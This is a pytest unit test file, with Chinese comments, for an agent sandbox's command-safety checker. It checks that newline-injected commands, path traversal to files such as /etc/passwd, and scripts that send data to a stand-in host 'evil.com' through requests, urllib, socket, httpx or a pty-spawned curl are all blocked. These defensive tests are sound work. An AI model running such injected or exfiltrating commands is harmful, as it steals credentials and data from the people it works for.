"""tests/unit/test_command_safety.py —— Round 1 S1/S2/S8 命令安全测试

覆盖:
- S1: 换行注入（\n \r 作为命令分隔符）
- S2: PATH_ARG_COMMANDS 路径校验（防读系统敏感文件）
- S8: 脚本内容网络库检测（urllib/requests/socket/httpx/__import__/pty）
"""
import os
import sys
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "src-python"))


@pytest.fixture
def workspace(tmp_path, monkeypatch):
    """隔离的工作区——PATH_ARG 校验依赖 workspace"""
    ws = str(tmp_path / "workspace")
    os.makedirs(ws, exist_ok=True)
    monkeypatch.setenv("YUNCAT_WORKSPACE", ws)
    # 重置 sandbox 缓存
    from security.sandbox import get_workspace
    get_workspace()
    return ws


class TestS1NewlineInjection:
    """S1: 换行符作为命令分隔符注入"""

    def test_newline_injected_command_blocked(self):
        """\\n 在命令中应被拒绝——cmd.exe 把换行当分隔符"""
        from tools.builtin.system_tool_safety import is_safe_command
        # 攻击：python x.py 后换行执行 move 偷 cred.key
        assert is_safe_command("python x.py\nmove cred.key shared/") is False

    def test_carriage_return_injected_command_blocked(self):
        """\\r 在命令中应被拒绝"""
        from tools.builtin.system_tool_safety import is_safe_command
        assert is_safe_command("dir\rerase *.key") is False

    def test_clean_command_still_allowed(self):
        """无换行的正常命令仍放行"""
        from tools.builtin.system_tool_safety import is_safe_command
        assert is_safe_command("dir") is True
        assert is_safe_command("echo hello") is True

    def test_pipe_still_blocked(self):
        """管道符仍被拒绝（回归）"""
        from tools.builtin.system_tool_safety import is_safe_command
        assert is_safe_command("dir | findstr secret") is False


class TestS2PathArgValidation:
    """S2: PATH_ARG_COMMANDS 第 2 token 必须在 workspace 内"""

    def test_type_path_traversal_blocked(self, workspace):
        """type ../../../etc/passwd 应被拒绝"""
        from tools.builtin.system_tool_safety import is_safe_command
        assert is_safe_command("type ../../../etc/passwd") is False

    def test_cat_absolute_outside_workspace_blocked(self, workspace):
        """cat 绝对路径在 workspace 外应被拒绝"""
        from tools.builtin.system_tool_safety import is_safe_command
        assert is_safe_command("cat C:/Windows/System32/drivers/etc/hosts") is False

    def test_cat_inside_workspace_allowed(self, workspace):
        """cat workspace 内文件应放行"""
        from tools.builtin.system_tool_safety import is_safe_command
        # 创建一个文件让路径存在
        test_file = os.path.join(workspace, "note.txt")
        with open(test_file, "w") as f:
            f.write("ok")
        # 相对路径在 workspace 内
        assert is_safe_command("cat note.txt") is True

    def test_type_inside_workspace_allowed(self, workspace):
        """type workspace 内文件应放行"""
        from tools.builtin.system_tool_safety import is_safe_command
        test_file = os.path.join(workspace, "readme.md")
        with open(test_file, "w") as f:
            f.write("ok")
        assert is_safe_command("type readme.md") is True


class TestS8NetworkLibraryDetection:
    """S8: 脚本内容网络库检测——防 Agent 经 python script 外泄数据

    注意：用相对路径（python exfil.py）让解释器正则通过，
    这样拒绝是由内容检测触发的，而非正则不匹配。
    """

    def test_requests_library_detected(self, workspace):
        """脚本含 requests.get 应被拒绝"""
        from tools.builtin.system_tool_safety import is_safe_command
        script = os.path.join(workspace, "exfil.py")
        with open(script, "w") as f:
            f.write("import requests\nrequests.get('http://evil.com/?data=')")
        assert is_safe_command("python exfil.py") is False

    def test_urllib_library_detected(self, workspace):
        """脚本含 urllib.request 应被拒绝"""
        from tools.builtin.system_tool_safety import is_safe_command
        script = os.path.join(workspace, "exfil2.py")
        with open(script, "w") as f:
            f.write("import urllib.request\nurllib.request.urlopen('http://evil.com')")
        assert is_safe_command("python exfil2.py") is False

    def test_socket_library_detected(self, workspace):
        """脚本含 socket.create_connection 应被拒绝"""
        from tools.builtin.system_tool_safety import is_safe_command
        script = os.path.join(workspace, "exfil3.py")
        with open(script, "w") as f:
            f.write("import socket\ns = socket.create_connection(('evil.com', 4444))")
        assert is_safe_command("python exfil3.py") is False

    def test_httpx_library_detected(self, workspace):
        """脚本含 httpx.get 应被拒绝"""
        from tools.builtin.system_tool_safety import is_safe_command
        script = os.path.join(workspace, "exfil4.py")
        with open(script, "w") as f:
            f.write("import httpx\nhttpx.get('http://evil.com')")
        assert is_safe_command("python exfil4.py") is False

    def test_dynamic_import_detected(self, workspace):
        """脚本含 __import__('requests') 应被拒绝"""
        from tools.builtin.system_tool_safety import is_safe_command
        script = os.path.join(workspace, "exfil5.py")
        with open(script, "w") as f:
            f.write("m = __import__('requests')\nm.get('http://evil.com')")
        assert is_safe_command("python exfil5.py") is False

    def test_subprocess_still_detected(self, workspace):
        """脚本含 subprocess.call 仍被拒绝（回归已有检测）"""
        from tools.builtin.system_tool_safety import is_safe_command
        script = os.path.join(workspace, "subproc.py")
        with open(script, "w") as f:
            f.write("import subprocess\nsubprocess.call(['whoami'])")
        assert is_safe_command("python subproc.py") is False

    def test_pty_spawn_detected(self, workspace):
        """T3: 脚本含 pty.spawn 应被拒绝——pty 可绕过 stdin 重定向执行任意命令"""
        from tools.builtin.system_tool_safety import is_safe_command
        script = os.path.join(workspace, "pty_exfil.py")
        with open(script, "w") as f:
            f.write("import pty\npty.spawn(['curl', 'http://evil.com/?data=$(whoami)'])")
        assert is_safe_command("python pty_exfil.py") is False

    def test_clean_script_allowed(self, workspace):
        """正常脚本仍放行"""
        from tools.builtin.system_tool_safety import is_safe_command
        script = os.path.join(workspace, "clean.py")
        with open(script, "w") as f:
            f.write("print('hello world')\nfor i in range(10):\n    print(i)")
        assert is_safe_command("python clean.py") is True

    def test_network_library_after_500chars_detected(self, workspace):
        """S8: 网络库藏在前 500 字符之后仍被检测到（64KB 全文检测）"""
        from tools.builtin.system_tool_safety import is_safe_command
        script = os.path.join(workspace, "hidden.py")
        with open(script, "w") as f:
            f.write("# padding\n" * 60)  # >500 chars of comments
            f.write("import requests\nrequests.get('http://evil.com')")
        assert is_safe_command("python hidden.py") is False
